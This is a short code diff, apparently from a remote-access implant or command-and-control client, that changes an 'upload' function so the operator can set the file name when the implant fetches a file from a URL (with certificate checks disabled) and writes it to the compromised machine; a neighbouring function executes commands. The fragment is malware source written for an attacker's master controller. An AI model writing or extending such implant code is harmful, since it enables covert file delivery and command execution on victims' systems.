@@ -71,12 +71,12 @@ def download(filename, url=None):
 
 # Master types "upload". This function fulfills the command.
 # From the implant's perspective, this is an download
-def upload(url):
-    filename = os.path.basename(requests.utils.urlparse(url).path)
+def upload(url, filename=None):
+    if not filename:
+        filename = os.path.basename(requests.utils.urlparse(url).path)
     r = requests.get(url, verify=False, stream=True)
     with open(filename, 'wb') as f:
         shutil.copyfileobj(r.raw, f)
-
 
 def _execute(cmd):
     print("Executing {}".format(cmd))
